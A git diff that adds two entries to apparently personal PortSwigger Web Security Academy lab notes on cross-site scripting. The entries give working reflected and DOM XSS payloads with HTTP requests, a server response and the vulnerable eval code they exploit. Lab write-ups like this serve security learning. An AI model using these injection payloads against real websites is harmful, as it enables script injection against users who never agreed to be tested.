@@ -93,6 +93,15 @@ csrf=M20B5PFxtj616yG2NUeu26yMhrYYFKMN&postId=2&comment=comment&name=name&email=e
 
 ![image-20240304224852418](./assets/image-20240304224852418.png)
 
+##### [Reflected XSS](https://portswigger.net/web-security/cross-site-scripting/reflected) into a JavaScript string with angle brackets HTML encoded
+
+```http
+GET /?search=%27-alert%281%29%2F%2F HTTP/2
+Host: web-security-academy.net
+```
+
+![image-20240313195714552](./assets/image-20240313195714552.png)
+
 #### Practitioner
 
 ##### [DOM XSS](https://portswigger.net/web-security/cross-site-scripting/dom-based) in `document.write` sink using source `location.search` inside a select element
@@ -112,6 +121,44 @@ Host: web-security-academy.net
 ```
 
 Payload from [PayloadAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/XSS%20Injection/XSS%20in%20Angular.md#storedreflected-xss---simple-alert-in-angularjs)
+
+##### Reflected [DOM XSS](https://portswigger.net/web-security/cross-site-scripting/dom-based)
+
+I had to lookup the solution for this one and even watch a community video to fully understand it. I didn't now that there was a difference between JSON and Javascript Objects. 
+
+If I had to summary the vulnerability, I would say that it is a content injection (we can inject content into the API response via unescaped "\"). Followed by triggering the `alert("xss")` function via an arithmetic operator ("-"). Also, unsafe use of the `eval` function.
+
+```http
+GET /search-results?search=%5C%22-alert%281%29%7D%2F%2F HTTP/2
+Host: web-security-academy.net
+```
+
+```http
+HTTP/2 200 OK
+Content-Type: application/json; charset=utf-8
+X-Frame-Options: SAMEORIGIN
+Content-Length: 45
+
+{"results":[],"searchTerm":"\\"-alert(1)}//"}
+```
+
+```javascript
+function search(path) {
+    var xhr = new XMLHttpRequest();
+    xhr.onreadystatechange = function() {
+        if (this.readyState == 4 && this.status == 200) {
+            eval('var searchResultsObj = ' + this.responseText);
+            displaySearchResults(searchResultsObj);
+        }
+    };
+[...]
+```
+
+Following the injection, the `eval` statement will look like:
+
+```javascript
+eval('var searchResultsObj = ' + ""-alert(1));
+```
 
 
 
